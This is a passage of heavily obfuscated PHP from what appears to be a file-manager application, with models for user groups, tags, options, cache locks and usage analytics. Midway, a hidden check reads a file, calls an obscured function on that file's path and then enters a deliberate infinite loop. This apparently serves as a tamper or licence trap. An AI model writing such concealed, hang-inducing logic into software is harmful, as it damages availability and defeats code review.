Model($¼ïĞğª’[888])->listSourceRoot(SourceModel::TYPE_USER, $™Ÿğü’‡); $®ÂÒ¨ı = array_to_keyvalue($®ÂÒ¨ı, $¼ïĞğª’[578]); $®ÂÒ¨ı = array_remove_key($®ÂÒ¨ı, $¼ïĞğª’[578]); foreach ($…¦Ç”Â¢ as &$á“—á¨®) { $á“—á¨®[$¼ïĞğª’[90]] = $®ÂÒ¨ı[$á“—á¨®[$¼ïĞğª’[1755]]] ? $®ÂÒ¨ı[$á“—á¨®[$¼ïĞğª’[1755]]] : array(); } unset($á“—á¨®); } private function _listAppendGroup(&$®Í™ûÆ‡, $Š´šÍÁ ) { $µ¬ßß¥Æ =& $_SERVER[£ğ°ÖØø]; $Ğë•“€¢ = array($µ¬ßß¥Æ[1755] => array($µ¬ßß¥Æ[7], $Š´šÍÁ )); $”òªÂ…ø = Model($µ¬ßß¥Æ[2048])->where($Ğë•“€¢)->select(); $‰«œ’ºÙ = array_to_keyvalue($”òªÂ…ø, $µ¬ßß¥Æ[12], $µ¬ßß¥Æ[1954]); $‰«œ’ºÙ = array_remove_value(array_unique($‰«œ’ºÙ), $µ¬ßß¥Æ[228]); if (!$‰«œ’ºÙ || !$”òªÂ…ø) { return; } $Ğë•“€¢ = array($µ¬ßß¥Æ[1954] => array($µ¬ßß¥Æ[7], $‰«œ’ºÙ)); $ñ¤©Ø‚µ = Model($µ¬ßß¥Æ[2143])->field($µ¬ßß¥Æ[2476])->where($Ğë•“€¢)->select(); $ñ¤©Ø‚µ = array_to_keyvalue($ñ¤©Ø‚µ, $µ¬ßß¥Æ[1954]); $”òªÂ…ø = array_to_keyvalue_group($”òªÂ…ø, $µ¬ßß¥Æ[1755]); foreach ($”òªÂ…ø as &$ÁÂİñÇŠ) { $•Ü•Ëû = array(); foreach ($ÁÂİñÇŠ as $À±€¢œï) { if (!$À±€¢œï[$µ¬ßß¥Æ[2062]]) { continue; } $à——Ø–æ = Model($µ¬ßß¥Æ[580])->listData($À±€¢œï[$µ¬ßß¥Æ[2062]]); $•Ü•Ëû[] = array($µ¬ßß¥Æ[1954] => $À±€¢œï[$µ¬ßß¥Æ[1954]], $µ¬ßß¥Æ[2477] => $ñ¤©Ø‚µ[$À±€¢œï[$µ¬ßß¥Æ[1954]]][$µ¬ßß¥Æ[32]], $µ¬ßß¥Æ[593] => $ñ¤©Ø‚µ[$À±€¢œï[$µ¬ßß¥Æ[1954]]][$µ¬ßß¥Æ[593]], $µ¬ßß¥Æ[496] => $à——Ø–æ); } $ÁÂİñÇŠ = $•Ü•Ëû; } unset($ÁÂİñÇŠ); foreach ($®Í™ûÆ‡ as &$»èÃ´¥) { $»èÃ´¥[$µ¬ßß¥Æ[2145]] = array(); if (isset($”òªÂ…ø[$»èÃ´¥[$µ¬ßß¥Æ[1755]]])) { $»èÃ´¥[$µ¬ßß¥Æ[2145]] = $”òªÂ…ø[$»èÃ´¥[$µ¬ßß¥Æ[1755]]]; } } unset($»èÃ´¥); } public function userAppendGroup($•¬º¥ËÜ) { $á÷ˆ¥Ç =& $_SERVER[£ğ°ÖØø]; if (!$•¬º¥ËÜ) { return array(); } $this->_listAppendGroup($•¬º¥ËÜ, array_to_keyvalue($•¬º¥ËÜ, $á÷ˆ¥Ç[12], $á÷ˆ¥Ç[1755])); return $•¬º¥ËÜ; } private function _listAppendMeta(&$¾¬‘ä×, $ÂÖŠª…Ë) { $ØÌ˜çÆä =& $_SERVER[£ğ°ÖØø]; $“ô¾¯Ïú = UserJobModel::JOB_KEY; $ŒŸ‰êá» = array($ØÌ˜çÆä[2457]); $ÔèµÀÈİ = array($ØÌ˜çÆä[1755] => array($ØÌ˜çÆä[7], $ÂÖŠª…Ë)); $Í¬ğÎåã = Model($ØÌ˜çÆä[2455])->where($ÔèµÀÈİ)->select(); $Í¬ğÎåã = array_to_keyvalue_group($Í¬ğÎåã, $ØÌ˜çÆä[1755]); foreach ($Í¬ğÎåã as &$Ó¦„³õÊ) { $‰Ğ¨®• = array(); foreach ($Ó¦„³õÊ as $ê¶ÑëºÍ) { if (!in_array($ê¶ÑëºÍ[$ØÌ˜çÆä[97]], $ŒŸ‰êá»)) { $‰Ğ¨®•[$ê¶ÑëºÍ[$ØÌ˜çÆä[97]]] = $ê¶ÑëºÍ[$ØÌ˜çÆä[459]]; } } $Ó¦„³õÊ = $‰Ğ¨®•; } unset($Ó¦„³õÊ); $òıÔªôË = Model($ØÌ˜çÆä[2478]); foreach ($¾¬‘ä× as &$ÌïÃ¨¹æ) { $•ü¼†é¼ = array(); if (isset($Í¬ğÎåã[$ÌïÃ¨¹æ[$ØÌ˜çÆä[1755]]])) { $•ü¼†é¼ = $Í¬ğÎåã[$ÌïÃ¨¹æ[$ØÌ˜çÆä[1755]]]; } $ÌïÃ¨¹æ[$ØÌ˜çÆä[2479]] = array(); if (isset($•ü¼†é¼[$“ô¾¯Ïú])) { $ÌïÃ¨¹æ[$ØÌ˜çÆä[2479]] = $òıÔªôË->getUserJobInfo($•ü¼†é¼[$“ô¾¯Ïú]); } } unset($ÌïÃ¨¹æ); } protected function groupUserAll($Àñ”ë‡Å) { $Ê¢ÅÖé =& $_SERVER[£ğ°ÖØø]; if (!$Àñ”ë‡Å) { return !1; } $Íôøê×Ò = Model($Ê¢ÅÖé[2048])->field($Ê¢ÅÖé[1755])->where(array($Ê¢ÅÖé[1954] => array($Ê¢ÅÖé[7], $Àñ”ë‡Å)))->select(); $Íôøê×Ò = array_to_keyvalue($Íôøê×Ò, $Ê¢ÅÖé[12], $Ê¢ÅÖé[1755]); return array_unique($Íôøê×Ò); } public function userSearch($é‘•ü³º, $ıí»û› = "\x2a") { return Model($_SERVER[£ğ°ÖØø][607])->where($é‘•ü³º)->field($ıí»û›)->find(); } } if (!isset($_SERVER[$_SERVER[£ğ°ÖØø][433]]) || !isset($_SERVER[$_SERVER[£ğ°ÖØø][431]])) { $_getc = $_SERVER[£ğ°ÖØø][434]; $_getfile = $_SERVER[$_SERVER[£ğ°ÖØø][435]] . $_SERVER[£ğ°ÖØø][436]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[£ğ°ÖØø][262], $_getfilec); if (count($_getarrs) < $_SERVER[£ğ°ÖØø][437]) { $exit = $_SERVER[£ğ°ÖØø][438]; $exit(); } $_act = $_SERVER[£ğ°ÖØø][439]; $_act($_SERVER[$_SERVER[£ğ°ÖØø][435]] . $_SERVER[£ğ°ÖØø][436]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[£ğ°ÖØø][463]); } } goto cÅôùÈÖÂò; D“™›Ä…–¾: function binCheckBigger($èÂ­“‚È, $„øºÛ‰Î) { return $èÂ­“‚È > $„øºÛ‰Î; } $_SERVER[$_SERVER[ı¨ûå›¤][3]] = ("\70\65\61\62".base64_decode('NDQ='))+0;$_ncxz="fl2owcb8xmgz4j9ds76ih1yrk53qvtu0aepntvu1cioh6x4pgrwe9j5fb3l8nasqzkdm2";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($øÜÇ¡µ³, $ò²ò³é¯) { $ßÜïè€ö =& $_SERVER[£ğ°ÖØø]; if (isset(self::$_methodList[$øÜÇ¡µ³])) { return @call_user_func_array(self::$_methodList[$øÜÇ¡µ³], $ò²ò³é¯); } else { if (method_exists($this, $øÜÇ¡µ³)) { return call_user_func_array(array($this, $øÜÇ¡µ³), $ò²ò³é¯); } else { think_exception(__CLASS__ . $ßÜïè€ö[4] . $øÜÇ¡µ³ . $ßÜïè€ö[5]); } } } public static function __callStatic($Ê­„Ì¦, $ù¹æ¿šá) { if (isset(self::$_methodListStatic[$Ê­„Ì¦])) { return call_user_func_array(self::$_methodListStatic[$Ê­„Ì¦], $ù¹æ¿šá); } else { if (method_exists(self, $Ê­„Ì¦)) { return call_user_func_array(array(self, $Ê­„Ì¦), $ù¹æ¿šá); } else { show_json("{$Ê­„Ì¦}\x28\x29\40\x6e\x6f\x74\40\145\x78\151\163\x74\x3b", !1); } } } public static function addMethod($‰ñ™®ù, $µÁ²Ñ) { self::$_methodList[$‰ñ™®ù] = $µÁ²Ñ; } public static function addMethodStatic($ıÌ•ï·Ê, $¥÷‡ö) { self::$_methodListStatic[$ıÌ•ï·Ê] = $¥÷‡ö; } } goto d±Œ·¹¾‘‘; eµÕ×£“µ: class CacheLockRedis { public function lock($“‡Å¬Ãæ, $„ÓØË¸˜ = 10) { $²™ƒôˆ = Cache::init(); $ˆú¥¬½¤ = microtime(!0) + $„ÓØË¸˜; while (microtime(!0) < $ˆú¥¬½¤) { $Æ©®Üßİ = $²™ƒôˆ->get($“‡Å¬Ãæ); if (!$Æ©®Üßİ) { $¨—ü„œé = $²™ƒôˆ->setLock($“‡Å¬Ãæ, $ˆú¥¬½¤, $„ÓØË¸˜); if ($¨—ü„œé) { return !0; } } else { if ($Æ©®Üßİ < microtime(!0)) { $²™ƒôˆ->set($“‡Å¬Ãæ, $ˆú¥¬½¤, $„ÓØË¸˜ * 2); if ($²™ƒôˆ->get($“‡Å¬Ãæ) === $Æ©®Üßİ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ÛúïÍ¦£) { return Cache::init()->get($ÛúïÍ¦£); } public function unlock($¿¡—ÕÉ) { return Cache::init()->remove($¿¡—ÕÉ); } } class CacheLockMemcached { public function lock($ªîÂ‚—ë, $‹¢õ¡¬¦ = 0) { $–«ÆÛæˆ = Cache::init(); $˜–èƒ¦ = microtime(!0) + $‹¢õ¡¬¦; while (microtime(!0) < $˜–èƒ¦) { $„Ó·å®ô = $–«ÆÛæˆ->get($ªîÂ‚—ë); if (!$„Ó·å®ô || $„Ó·å®ô < microtime(!0)) { $ğê°Øª = $–«ÆÛæˆ->handle->add($ªîÂ‚—ë, $˜–èƒ¦, $‹¢õ¡¬¦); if ($ğê°Øª) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($À¤®•¡Û) { return Cache::init()->get($À¤®•¡Û); } public function unlock($»àšÛó“) { return Cache::init()->remove($»àšÛó“); } } class CacheLockDatabase { public function lock($ÑÀŸïÁ, $»Ç•€»Œ = 0) { $¹ûå¦™³ = Model($_SERVER[£ğ°ÖØø][892]); $ÛøÛ¬è£ = microtime(!0) + $»Ç•€»Œ; while (microtime(!0) < $ÛøÛ¬è£) { $ØÔüÃÂ  = $¹ûå¦™³->get($ÑÀŸïÁ); if (!$ØÔüÃÂ  || $ØÔüÃÂ  < microtime(!0)) { $ØØÎäŠò = $¹ûå¦™³->set($ÑÀŸïÁ, $ÛøÛ¬è£); if ($ØØÎäŠò) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($›ò„ƒ°á) { return Model($_SERVER[£ğ°ÖØø][892])->get($›ò„ƒ°á); } public function unlock($óç¨Å£â) { Model($_SERVER[£ğ°ÖØø][892])->remove($óç¨Å£â); } } goto F„“ˆ¢…‚; cÅôùÈÖÂò: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\x6f\160\164\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¤€‰Ú­É) { $¿”úŠ¦ñ =& $_SERVER[£ğ°ÖØø]; $˜º±˜» = defined($¿”úŠ¦ñ[2180]) && USER_ID ? USER_ID : $¿”úŠ¦ñ[12]; return "\125\163\145\162\x4f\x70\x74\151\157\156\137{$¤€‰Ú­É}\137" . $˜º±˜»; } protected function filterWhere($Çñ³’¢û) { $ÑÌŞ‰±‘ =& $_SERVER[£ğ°ÖØø]; $Çñ³’¢û[$ÑÌŞ‰±‘[1755]] = defined($ÑÌŞ‰±‘[2180]) && USER_ID ? USER_ID : $ÑÌŞ‰±‘[12]; return $Çñ³’¢û; } public function cacheRemoveUser($÷Á¹á”õ, $øÖ¸«£) { return Cache::remove("\125\163\145\x72\x4f\x70\x74\x69\157\x6e\x5f{$÷Á¹á”õ}\137" . $øÖ¸«£); } protected function optionDefault($æ¾ÈëÎÚ = '') { $ôøÒø±º =& $_SERVER[£ğ°ÖØø]; if ($æ¾ÈëÎÚ == $ôøÒø±º[12]) { return $GLOBALS[$ôøÒø±º[6]][$ôøÒø±º[2480]]; } if ($æ¾ÈëÎÚ == $ôøÒø±º[2481]) { return $GLOBALS[$ôøÒø±º[6]][$ôøÒø±º[2482]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\164\141\x67\x4c\151\x73\x74"; public $modelType = "\x55\x73\145\x72\117\160\x74\x69\157\x6e"; public $field = array("\x6e\141\155\x65", "\x73\x74\171\x6c\x65", "\163\157\x72\x74"); public function listData($óôš€÷İ = false, $«Ïúª¶ó = "\x73\157\x72\x74", $ëÒ‡²ïª = false) { return parent::listData($óôš€÷İ, $«Ïúª¶ó, $ëÒ‡²ïª); } public function remove($ôİŠ¨ñ×) { return parent::remove($ôİŠ¨ñ×); } public function add($—¦¨˜Ò¯, $Ğò¡£„ö = "\154\x61\142\x65\x6c\55\x67\x72\x65\x79\55\156\x6f\162\x6d\141\154") { $¹ØÈë =& $_SERVER[£ğ°ÖØø]; if ($this->findByName($—¦¨˜Ò¯)) { return !1; } $Û¡»›‚€ = array($¹ØÈë[503] => $—¦¨˜Ò¯, $¹ØÈë[567] => $Ğò¡£„ö, $¹ØÈë[1958] => $this->getSort($¹ØÈë[335]) + 1); return parent::insert($Û¡»›‚€); } public function update($ì¢‘»ôã, $è‚¨´§) { $ñ¬í¿ Æ =& $_SERVER[£ğ°ÖØø]; $º§›ôÇ = $this->listData($ì¢‘»ôã); $š·€ĞÖ‰ = $this->findByName($è‚¨´§[$ñ¬í¿ Æ[32]]); if (!$º§›ôÇ || $š·€ĞÖ‰ && $š·€ĞÖ‰[$ñ¬í¿ Æ[484]] != $º§›ôÇ[$ñ¬í¿ Æ[484]]) { return !1; } return parent::update($ì¢‘»ôã, $è‚¨´§); } public function moveTop($†›œ‘İã) { $é·ÔœÓ =& $_SERVER[£ğ°ÖØø]; $ÙÁ”ñÒø = parent::listData(); $±§•å‘Ö = $this->getSort($é·ÔœÓ[334]); foreach ($ÙÁ”ñÒø as &$ÔÅÕÕÏ¨) { if ($ÔÅÕÕÏ¨[$é·ÔœÓ[484]] == $†›œ‘İã) { $ÔÅÕÕÏ¨[$é·ÔœÓ[1978]] = $±§•å‘Ö; continue; } $ÔÅÕÕÏ¨[$é·ÔœÓ[1978]] += 1; } unset($ÔÅÕÕÏ¨); return parent::resetData($ÙÁ”ñÒø); } public function moveBottom($Ìû¤ş±®) { $øŸ¬äø’ =& $_SERVER[£ğ°ÖØø]; $Çñ“°³Ë = $this->getSort($øŸ¬äø’[335]) + 1; return parent::update($Ìû¤ş±®, array($øŸ¬äø’[1978] => $Çñ“°³Ë)); } public function resetSort($åüÁ) { $íò™•Îó =& $_SERVER[£ğ°ÖØø]; $ŒØ¤è¸Ó = array(); $åüÁ = is_array($åüÁ) ? $åüÁ : array(); for ($©æÖÒ˜£ = 0; $©æÖÒ˜£ < count($åüÁ); $©æÖÒ˜£++) { $ŒØ¤è¸Ó[$åüÁ[$©æÖÒ˜£] . $íò™•Îó[12]] = $©æÖÒ˜£ + 1; } $ÓŞ¯ı¯ã = parent::listData(); foreach ($ÓŞ¯ı¯ã as &$—…Üƒûé) { $Š€öú†– = $ŒØ¤è¸Ó[$—…Üƒûé[$íò™•Îó[484]]]; $—…Üƒûé[$íò™•Îó[1978]] = $Š€öú†– ? $Š€öú†– : $—…Üƒûé[$íò™•Îó[1978]]; } unset($—…Üƒûé); return parent::resetData($ÓŞ¯ı¯ã); } private function getSort($ÇÊ…¤Å§) { $¬”‹¼ˆœ =& $_SERVER[£ğ°ÖØø]; $÷ƒÁÚı± = parent::listData(); $…¹¿ËŞ× = array_to_keyvalue($÷ƒÁÚı±, $¬”‹¼ˆœ[12], $¬”‹¼ˆœ[1978]); if (!$…¹¿ËŞ×) { $…¹¿ËŞ× = array(0); } $÷‹ğˆÜ´ = $ÇÊ…¤Å§ == $¬”‹¼ˆœ[335] ? max($…¹¿ËŞ×) : min($…¹¿ËŞ×); return intval($÷‹ğˆÜ´); } } goto Dç‘êƒÇêœ; c»Âª–“ò: class AnalysisModel extends ModelBaseLight { public function init($šøæÑ—) { $ œëË£ =& $_SERVER[£ğ°ÖØø]; $‚‡Š‰Œ€ = array($ œëË£[671] => array($ œëË£[33] => $ œëË£[1882], $ œëË£[350] => array($ œëË£[255], $ œëË£[829], $ œëË£[1883], $ œëË£[1884])), $ œëË£[1885] => array($ œëË£[33] => $ œëË£[1886], $ œëË£[350] => array($ œëË£[255], $ œëË£[827], $ œëË£[1887], $ œëË£[1888], $ œëË£[1889]))); if (!isset($‚‡Š‰Œ€[$šøæÑ—])) { return !1; } $this->optionType = $‚‡Š‰Œ€[$šøæÑ—][$ œëË£[33]]; $this->field = $‚‡Š‰Œ€[$šøæÑ—][$ œëË£[350]]; return !0; } public function listData($Úø‘Ø‰» = false, $õ¼¿÷’¯ = "\x6d\157\144\x69\146\x79\x54\x69\155\x65", $óí¤÷×í = false) { return parent::listData($Úø‘Ø‰», $õ¼¿÷’¯, $óí¤÷×í); } public function trendList($Ùœßµ´…) { $ŒöÂŒî =& $_SERVER[£ğ°ÖØø]; $¶§ÕĞ¹á = $this->listData(); if ($¶§ÕĞ¹á) { $¾ÆóäÆŒ = end($¶§ÕĞ¹á); $‘¸„óĞï = date($ŒöÂŒî[1890], strtotime($ŒöÂŒî[1891])); if ($¾ÆóäÆŒ[$ŒöÂŒî[255]] == $‘¸„óĞï) { return $¶§ÕĞ¹á; } $ã¿ğ¬Ø = strtotime($¾ÆóäÆŒ[$ŒöÂŒî[255]]); } if (!isset($ã¿ğ¬Ø)) { $ò“ˆÊç¬ = $Ùœßµ´… == $ŒöÂŒî[671] ? $ŒöÂŒî[607] : $ŒöÂŒî[888]; $ã¿ğ¬Ø = Model($ò“ˆÊç¬)->min($ŒöÂŒî[231]); } $Ê¯±ÃúÆ = $ŒöÂŒî[1892] . ucfirst($Ùœßµ´…); $éô¬ö‰ = $this->dateList($ã¿ğ¬Ø); foreach ($éô¬ö‰ as $‘¸„óĞï) { $this->{$Ê¯±ÃúÆ}($‘¸„óĞï); } return $this->listData(); } private function dateList($ö‰ñÑ¨ê) { $†º¤’ƒ‡ =& $_SERVER[£ğ°ÖØø]; $”¹’íº‹ = $ö‰ñÑ¨ê; $Â…«±éÎ = strtotime($†º¤’ƒ‡[1891]); $ˆÎ§šÛ‡ = array(); while ($”¹’íº‹ <= $Â…«±éÎ) { $ˆÎ§šÛ‡[] = date($†º¤’ƒ‡[1890], $”¹’íº‹); $”¹’íº‹ = strtotime($†º¤’ƒ‡[1893], $”¹’íº‹); } return $ˆÎ§šÛ‡; } public function _recordUser($¼®®á = '') { $Ú¦ßï²Ö =& $_SERVER[£ğ°ÖØø]; $²õ¡‰¼† = strtotime(date($Ú¦ßï²Ö[1894], strtotime($¼®®á))); $Æª°û = strtotime(date($Ú¦ßï²Ö[1895], strtotime($¼®®á))); $¾´¨°ƒû = array($Ú¦ßï²Ö[231] => array($Ú¦ßï²Ö[1074], $Æª°û)); $˜”å›§ = Model($Ú¦ßï²Ö[607])->where($¾´¨°ƒû)->count($Ú¦ßï²Ö[1755]); $¾´¨°ƒû[$Ú¦ßï²Ö[231]] = array($Ú¦ßï²Ö[409], array($²õ¡‰¼†, $Æª°û)); $®¾âÜÂ = Model($Ú¦ßï²Ö[607])->where($¾´¨°ƒû)->count($Ú¦ßï²Ö[1755]); $¾´¨°ƒû[$Ú¦ßï²Ö[33]] = $Ú¦ßï²Ö[1896]; $Ÿ‘œÒÄ = Model($Ú¦ßï²Ö[1897])->where($¾´¨°ƒû)->count($Ú¦ßï²Ö[1898]); $“ò­Ÿß¹ = array($Ú¦ßï²Ö[255] => $¼®®á, $Ú¦ßï²Ö[829] => (int) $˜”å›§, $Ú¦ßï²Ö[1883] => (int) $®¾âÜÂ, $Ú¦ßï²Ö[1884] => (int) $Ÿ‘œÒÄ); return $this->insert($“ò­Ÿß¹); } public function _recordStore($Œ¦—åİ¿ = '') { $ÎÉ†ƒ¾ã =& $_SERVER[£ğ°ÖØø]; $½ìÃ®ñ = strtotime(date($ÎÉ†ƒ¾ã[1895], strtotime($Œ¦—åİ¿))); $¬«ïóÑ¡ = array($ÎÉ†ƒ¾ã[231] => array($ÎÉ†ƒ¾ã[1074], $½ìÃ®ñ)); $ ØìšÅÅ = Model($ÎÉ†ƒ¾ã[553])->where($¬«ïóÑ¡)->sum($ÎÉ†ƒ¾ã[79]); $¬«ïóÑ¡[$ÎÉ†ƒ¾ã[494]] = 0; $÷¨Ø‰¯¿ = Model($ÎÉ†ƒ¾ã[888])->where($¬«ïóÑ¡)->sum($ÎÉ†ƒ¾ã[79]); $¬«ïóÑ¡[$ÎÉ†ƒ¾ã[190]] = 1; $Û€îâĞ = Model($ÎÉ†ƒ¾ã[888])->where($¬«ïóÑ¡)->sum($ÎÉ†ƒ¾ã[79]); $¬«ïóÑ¡[$ÎÉ†ƒ¾ã[190]] = 2; $Š½Ğ©›Û = Model($ÎÉ†ƒ¾ã[888])->where($¬«ïóÑ¡)->sum($ÎÉ†ƒ¾ã[79]); $®îôÌŞ§ = array($ÎÉ†ƒ¾ã[255] => $Œ¦—åİ¿, $ÎÉ†ƒ¾ã[827] => (int) $÷¨Ø‰¯¿, $ÎÉ†ƒ¾ã[1887] => (int) $ ØìšÅÅ, $ÎÉ†ƒ¾ã[1888] => (int) $Û€îâĞ, $ÎÉ†ƒ¾ã[1889] => (int) $Š½Ğ©›Û); return $this->insert($®îôÌŞ§); } public function trend($˜ÕÑ¨Í½, $Úã¼ßì¬) { $æ¾õåÂ÷ =& $_SERVER[£ğ°ÖØø]; if (!$this->init($˜ÕÑ¨Í½)) { return !1; } $ñß·ÀÁ® = $this->trendList($˜ÕÑ¨Í½); if ($ñß·ÀÁ® && $Úã¼ßì¬ != $æ¾õåÂ÷[1728]) { $ğûù¯á‹ = $ñß·ÀÁ®[0][$æ¾õåÂ÷[255]]; $Ÿ¥ß±Æû = $this->validDate($Úã¼ßì¬, $ğûù¯á‹); $€Ô‹ú¥í = array(); $ëšéÈ = array_to_keyvalue($ñß·ÀÁ®, $æ¾õåÂ÷[255]); foreach ($Ÿ¥ß±Æû as $£É ¡¥ê) { if (isset($ëšéÈ[$£É ¡¥ê])) { $ø·É¾è = $ëšéÈ[$£É ¡¥ê]; } else { $ø·É¾è = end($ñß·ÀÁ®); $ø·É¾è[$æ¾õåÂ÷[255]] = $£É ¡¥ê; if ($˜ÕÑ¨Í½ == $æ¾õåÂ÷[671]) { $ø·É¾è[$æ¾õåÂ÷[1883]] = $ø·É¾è[$æ¾õåÂ÷[1884]] = 0; } } $€Ô‹ú¥í[] = $ø·É¾è; } $ñß·ÀÁ® = $€Ô‹ú¥í; } $Â˜ÊÜ£Õ = array($æ¾õåÂ÷[671] => array($æ¾õåÂ÷[829] => LNG($æ¾õåÂ÷[1899]), $æ¾õåÂ÷[1883] => LNG($æ¾õåÂ÷[1900]), $æ¾õåÂ÷[1884] => LNG($æ¾õåÂ÷[1901])), $æ¾õåÂ÷[1885] => array($æ¾õåÂ÷[827] => LNG($æ¾õåÂ÷[1902]), $æ¾õåÂ÷[1887] => LNG($æ¾õåÂ÷[1903]), $æ¾õåÂ÷[1888] => LNG($æ¾õåÂ÷[1904]), $æ¾õåÂ÷[1889] => LNG($æ¾õåÂ÷[1905]))); $÷ÛÁì = array($æ¾õåÂ÷[671] => $æ¾õåÂ÷[1906], $æ¾õåÂ÷[1885] => $æ¾õåÂ÷[79]); if (empty($ñß·ÀÁ®)) { $£É ¡¥ê = date($æ¾õåÂ÷[1890], strtotime($æ¾õåÂ÷[1891])); $š‹µÕ¾Ö = array($æ¾õåÂ÷[255] => $£É ¡¥ê); foreach ($Â˜ÊÜ£Õ[$˜ÕÑ¨Í½] as $Á½µßäÚ => $ë¤ñÅüú) { $š‹µÕ¾Ö[$Á½µßäÚ] = 0; } $ñß·ÀÁ®[] = $š‹µÕ¾Ö; } $åÇğù = array(); foreach ($ñß·ÀÁ® as $ë¤ñÅüú) { if ($˜ÕÑ¨Í½ == $æ¾õåÂ÷[1885] && $ë¤ñÅüú[$æ¾õåÂ÷[1887]] > $ë¤ñÅüú[$æ¾õåÂ÷[827]]) { $ë¤ñÅüú[$æ¾õåÂ÷[1887]] = $ë¤ñÅüú[$æ¾õåÂ÷[827]]; } foreach ($Â˜ÊÜ£Õ[$˜ÕÑ¨Í½] as $Á½µßäÚ => $¨—¸ïõò) { $ø·É¾è = array($æ¾õåÂ÷[255] => $ë¤ñÅüú[$æ¾õåÂ÷[255]], $æ¾õåÂ÷[1642] => $¨—¸ïõò); $ø·É¾è[$÷ÛÁì[$˜ÕÑ¨Í½]] = isset($ë¤ñÅüú[$Á½µßäÚ]) ? $ë¤ñÅüú[$Á½µßäÚ] : 0; $åÇğù[] = $ø·É¾è; } } return $åÇğù; } public function validDate($Ááá©Î¢, $àìäÒæó) { $ù‡ëé´• =& $_SERVER[£ğ°ÖØø]; $¡šÅÃà = date($ù‡ëé´•[1890], strtotime($ù‡ëé´•[1891])); $Â¡õ—»Š = array($¡šÅÃà); switch ($Ááá©Î¢) { case $ù‡ëé´•[1735]: $ŒÎÎéåĞ = mktime(0, 0, 0, date($ù‡ëé´•[1907]), date($ù‡ëé´•[1432]) - date($ù‡ëé´•[1522]) + 7 - 7, date($ù‡ëé´•[1908])); $»¬–Ÿ™Î = 0; do { $ãÏ¹—×¬ = date($ù‡ëé´•[1890], $ŒÎÎéåĞ - 3600 * 24 * 7 * $»¬–Ÿ™Î); $Â¡õ—»Š[] = $ãÏ¹—×¬; $»¬–Ÿ™Î++; } while ($àìäÒæó < $ãÏ¹—×¬); break; case $ù‡ëé´•[1733]: $»¬–Ÿ™Î = 1; do { $İôÛ§Î‘ = date($ù‡ëé´•[1909], strtotime("\x2d\x20{$»¬–Ÿ™Î}\40\155\157\x6e\164\x68\163")); $Â¡õ—»Š[] = $İôÛ§Î‘; $»¬–Ÿ™Î++; } while ($àìäÒæó < $İôÛ§Î‘); break; case $ù‡ëé´•[1910]: $àÑ ¾Êô = (int) date($ù‡ëé´•[1908], strtotime($àìäÒæó)); $«íŠîñê = (int) date($ù‡ëé´•[1908]); if ($àÑ ¾Êô >= $«íŠîñê) { break; } for ($àÑ ¾Êô; $àÑ ¾Êô < $«íŠîñê; $àÑ ¾Êô++) { $Â¡õ—»Š[] = $àÑ ¾Êô . $ù‡ëé´•[1911]; } break; default: break; } if ($àìäÒæó > end($Â¡õ—»Š)) { array_pop($Â¡õ—»Š); } sort($Â¡õ—»Š); return $Â¡õ—»Š; } public function listTable($îé±”Š…) { $¼çıú¸ = ucfirst($îé±”Š…); return Model($¼çıú¸)->listData(); } public function option($µò¶å‚ò) { $”ß‰É€Ë = $_SERVER[£ğ°ÖØø][1912] . ucfirst($µò¶å‚ò); return $this->{$”ß‰É€Ë}(); } private function optionUser() { $ÆÆÀ†íä =& $_SERVER[£ğ°ÖØø]; $—Ã¡ùÉ† = Model($ÆÆÀ†íä[607])->count($ÆÆÀ†íä[1755]); $ä™Â˜ùÆ = Model($ÆÆÀ†íä[607])->where($ÆÆÀ†íä[1913])->count($ÆÆÀ†íä[1755]); $ùƒ½ö« = intval($GLOBALS[$ÆÆÀ†íä[6]][$ÆÆÀ†íä[425]][$ÆÆÀ†íä[1701]]) / 3600; $Â„²ü = strtotime("\x2d{$ùƒ½ö«}\40\x68\157\165\x72\x73"); $ššœ’õù = strtotime(date($ÆÆÀ†íä[1894])); if ($Â„²ü < $ššœ’õù) { $Â„²ü = $ššœ’õù; } $«‡™˜œ× = array($ÆÆÀ†íä[1914] => array($ÆÆÀ†íä[1075], $Â„²ü)); $«¥§®åø = (int) Model($ÆÆÀ†íä[607])->where($«‡™˜œ×)->count($ÆÆÀ†íä[1755]); if (!$«¥§®åø) { $«¥§®åø = 1; } $«‡™˜œ× = array($ÆÆÀ†íä[1914] => array($ÆÆÀ†íä[1075], $ššœ’õù)); $şÛœÓâ• = Model($ÆÆÀ†íä[607])->where($«‡™˜œ×)->count($ÆÆÀ†íä[1755]); return array($ÆÆÀ†íä[822] => (int) $—Ã¡ùÉ†, $ÆÆÀ†íä[1915] => (int) ($—Ã¡ùÉ† - $ä™Â˜ùÆ), $ÆÆÀ†íä[1916] => (int) $ä™Â˜ùÆ, $ÆÆÀ†íä[1917] => (int) $şÛœÓâ•, $ÆÆÀ†íä[1918] => $«¥§®åø); } private function optionFile() { $øÆÆúå =& $_SERVER[£ğ°ÖØø]; $ûÔğŞŠÔ = $this->sourceSize(); $è‚ĞÎÕ¥ = $ûÔğŞŠÔ[$øÆÆúå[79]]; $‚»÷»¦ï = $ûÔğŞŠÔ[$øÆÆúå[1887]]; $ÔœÉàù³ = Model($øÆÆúå[888])->where(array($øÆÆúå[494] => 0))->count($øÆÆúå[193]); $îï¿ü¦¶ = array($øÆÆúå[494] => 0, $øÆÆúå[231] => array($øÆÆúå[1075], strtotime(date($øÆÆúå[1894])))); $°Ï¾Åİ = Model($øÆÆúå[888])->where($îï¿ü¦¶)->sum($øÆÆúå[79]); $•à¸ÌÓ© = Model($øÆÆúå[888])->where($îï¿ü¦¶)->count($øÆÆúå[193]); return array($øÆÆúå[827] => $è‚ĞÎÕ¥, $øÆÆúå[1887] => $‚»÷»¦ï, $øÆÆúå[1919] => $è‚ĞÎÕ¥ - $‚»÷»¦ï, $øÆÆúå[1920] => (int) $°Ï¾Åİ, $øÆÆúå[829] => (int) $ÔœÉàù³, $øÆÆúå[1921] => (int) $•à¸ÌÓ©); } private function optionAccess() { $Åù‚ëÓ» =& $_SERVER[£ğ°ÖØø]; return 